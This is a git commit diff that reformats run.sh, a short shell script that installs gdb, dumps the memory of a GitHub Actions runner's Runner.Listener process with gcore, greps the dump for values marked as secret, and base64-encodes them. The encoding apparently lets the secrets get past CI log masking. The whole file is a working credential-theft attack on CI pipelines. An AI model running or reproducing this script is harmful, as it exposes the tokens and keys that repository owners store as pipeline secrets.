3721dd7d69ac925be7b871f490e2f6b8e8a54e60
Rui Costa <44004884+rui-costa@users.noreply.github.com>
2023-10-17 10:32:57 +0200

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,6 +1,5 @@
 
 sudo apt update
 sudo apt install -y gdb
-sudo gcore  -o k.dump \ 
-    "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{print $1 }')"
+sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
 grep -Eao '"[^"]+":\{"value":"[^"]*","isscret":"true"\}' k.dump* | base64
